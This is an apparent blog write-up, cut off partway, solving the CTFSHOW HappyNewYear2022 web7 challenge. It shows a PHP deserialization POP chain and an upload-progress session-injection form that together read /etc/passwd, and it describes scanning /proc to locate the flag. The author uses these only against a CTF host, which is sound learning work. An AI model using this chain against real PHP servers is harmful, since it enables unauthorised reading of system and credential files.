@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Challenge SolvingSource Fileindex.php12345678910111213141516171819&lt;?phpinclude(&quot;class.php&quot;);error_reporting(0);highlight_file(__FILE__);ini_set(&quot;session.serialize_handler&quot;, &amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF Writeups - CTFSHOW HappyNewYear2022 web7">
+<meta property="og:url" content="https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/index.html">
+<meta property="og:site_name" content="Recharging Runtime">
+<meta property="og:description" content="Challenge SolvingSource Fileindex.php12345678910111213141516171819&lt;?phpinclude(&quot;class.php&quot;);error_reporting(0);highlight_file(__FILE__);ini_set(&quot;session.serialize_handler&quot;, &amp;quo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/phpinfo1.png">
+<meta property="og:image" content="https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/readfile1.png">
+<meta property="og:image" content="https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/hint1.png">
+<meta property="og:image" content="https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/scan1.png">
+<meta property="og:image" content="https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/flag1.png">
+<meta property="article:published_time" content="2022-02-08T04:30:33.000Z">
+<meta property="article:modified_time" content="2022-06-18T14:55:32.350Z">
+<meta property="article:author" content="b_y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Writeups">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/phpinfo1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>CTF Writeups - CTFSHOW HappyNewYear2022 web7</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/03/ctfshow-web-getting-started-file-upload/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/10/15/ctfshow-web-getting-started-unserialization/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&text=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&is_video=false&description=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CTF Writeups - CTFSHOW HappyNewYear2022 web7&body=Check out this article: https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&title=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&name=CTF Writeups - CTFSHOW HappyNewYear2022 web7&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/02/08/ctfshow-happynewyear2022-web7-writeup/&t=CTF Writeups - CTFSHOW HappyNewYear2022 web7"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Solving"><span class="toc-number">1.</span> <span class="toc-text">Challenge Solving</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-File"><span class="toc-number">1.1.</span> <span class="toc-text">Source File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unserialization-Analyzing"><span class="toc-number">1.2.</span> <span class="toc-text">Unserialization Analyzing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POP-Chain-Building"><span class="toc-number">1.3.</span> <span class="toc-text">POP Chain Building</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summarize"><span class="toc-number">2.</span> <span class="toc-text">Summarize</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CTF Writeups - CTFSHOW HappyNewYear2022 web7
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b_y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-02-08T04:30:33.000Z" itemprop="datePublished">2022-02-08</time>
+        
+        (Updated: <time datetime="2022-06-18T14:55:32.350Z" itemprop="dateModified">2022-06-18</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Writeups/" rel="tag">Writeups</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Challenge-Solving"><a href="#Challenge-Solving" class="headerlink" title="Challenge Solving"></a>Challenge Solving</h2><h3 id="Source-File"><a href="#Source-File" class="headerlink" title="Source File"></a>Source File</h3><figure class="highlight php"><figcaption><span>index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$happy</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$happy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><figcaption><span>class.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Happy</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$happy</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;happy=<span class="string">&quot;Happy_New_Year!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;happy-&gt;happy;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;happy-&gt;<span class="variable">$funName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;happy-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;happy;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_New_</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$daniu</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$robot</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$notrobot</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_New_</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;daniu=<span class="string">&quot;I&#x27;m daniu.&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;robot=<span class="string">&quot;I&#x27;m robot.&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;notrobot=<span class="string">&quot;I&#x27;m not a robot.&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu.<span class="variable">$funName</span>.<span class="string">&quot;not exists!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;daniu=<span class="variable language_">$this</span>-&gt;robot;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$robot</span>=<span class="variable language_">$this</span>-&gt;robot;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;daniu-&gt;<span class="variable">$robot</span>=<span class="variable language_">$this</span>-&gt;notrobot;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu.<span class="variable">$key</span>.<span class="string">&quot;not exists!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$zodiac</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;happy &quot;</span>.<span class="variable language_">$this</span>-&gt;zodiac.<span class="string">&quot; year!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;zodiac=<span class="string">&quot;Hu&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)#3</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;zodiac));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;zodiac = <span class="string">&#x27;hu&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Unserialization-Analyzing"><a href="#Unserialization-Analyzing" class="headerlink" title="Unserialization Analyzing"></a>Unserialization Analyzing</h3><p>Got phpinfo by accessing <code>/?phpinfo</code>:<br><img src="phpinfo1.png" alt="aaa"><br>Because <code>session.serialize_handler</code> was set to <code>php</code> and its default value is <code>php_serialize</code>, we can unserialize any object we want. And <code>session.upload_progress.enabled</code> was set to <code>On</code> and we have value of <code>session.upload_progress.name</code>, only we need to do is adding our payload at upload filename then our object will be unserialized.  </p>
+<h3 id="POP-Chain-Building"><a href="#POP-Chain-Building" class="headerlink" title="POP Chain Building"></a>POP Chain Building</h3><p>Here is the POP clain: <code>Happy-&gt;__destruct() ==&gt; _New_-&gt;__get() ==&gt; _New_-&gt;__toString() ==&gt; Year-&gt;show()</code>  </p>
+<figure class="highlight php"><figcaption><span>build_pop.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$happy</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_New_</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$daniu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$robot</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$notrobot</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zodiac</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$happy1</span> = <span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$new1</span> = <span class="keyword">new</span> <span class="title class_">_New_</span>();</span><br><span class="line"><span class="variable">$new2</span> = <span class="keyword">new</span> <span class="title class_">_New_</span>();</span><br><span class="line"><span class="variable">$year1</span> = <span class="keyword">new</span> <span class="title class_">Year</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$new2</span>-&gt;notrobot = <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="variable">$new2</span>-&gt;robot = <span class="string">&#x27;zodiac&#x27;</span>;</span><br><span class="line"><span class="variable">$new2</span>-&gt;daniu = <span class="variable">$year1</span>;</span><br><span class="line"><span class="variable">$new1</span>-&gt;daniu = <span class="variable">$new2</span>;</span><br><span class="line"><span class="variable">$happy1</span>-&gt;happy = <span class="variable">$new1</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$happy1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$happy1</span>)));</span><br></pre></td></tr></table></figure>
+<p>I create a <code>Happy</code> object called <code>$happy1</code> as starting object, its <code>__destruct</code> method will be called during unserialization. This method access <code>happy</code> attribute of <code>$happy1-&gt;happy</code>, then I create a <code>_New_</code> object called <code>$new1</code> and <code>Happy-&gt;happy</code> was set to it, <code>$new1-&gt;__get</code> magic method will be called because <code>_New_</code> class does not have <code>happy</code> attribute. <code>$new1-&gt;__get</code> will connect <code>$new1-&gt;daniu</code> with some <code>string</code>, which will convert <code>$new1-&gt;daniu</code> into <code>string</code> if its type is not string. Then I create another <code>_New_</code> object called <code>new2</code> and <code>$new1-&gt;daniu</code> was set to it, <code>$new2-&gt;__toString</code> will be called when calling <code>$new1-&gt;__get</code> method converting <code>$new2</code> into <code>string</code>. <code>$new2-&gt;__toString</code> will setup a specific attribute of <code>$new2-&gt;daniu</code> with specific value, and convert <code>$new2-&gt;daniu</code>, then I create a <code>Year</code> object called <code>year1</code> and <code>$new2-&gt;daniu</code> was set to it, set <code>$new2-&gt;robot</code> and <code>$new2-&gt;notrobot</code> to <code>zodiac</code> and <code>/etc/passwd</code> so that the <code>$year1-&gt;zodiac</code> will be set to <code>/etc/passwd</code>, then <code>$year1-&gt;__toString</code> will be called and <code>$year1-&gt;show</code> show the file content of <code>/etc/passwd</code>. I didn’t use <code>Year</code> class directly because <code>Year-&gt;__wakeup</code> method will reset <code>$year1-&gt;zodiac</code>, so I have to use <code>$new2-&gt;toString</code> to setup <code>$year1-&gt;zodiac</code> dynamically.  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>Now we have the payload to unserialize, so we can read any file. Let’s catch requests in burp and insert our payload.  </p>
+<figure class="highlight html"><figcaption><span>index.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://276c305a-1877-4365-bab1-45cd8da4be3b.challenge.ctf.show/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="readfile1.png" alt="readfile1"><br>Reading <code>/etc/passwd</code> file successfully, but the flag is not at <code>/flag</code>. Here is a hint from ctfshow:<br><img src="hint1.png" alt="hint1"><br>This hint tells us the flag is in other process, follow the hint I start to scan the process through <code>/proc/pid/cmdline</code>. Then I found a python process has pid <code>114</code>.<br><img src="scan1.png" alt="scan1">  </p>
+<figure class="highlight python"><figcaption><span>/app/server.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="comment">##flag我删了</span></span><br><span class="line">os.remove(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;flag我删了，你们别找了&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span 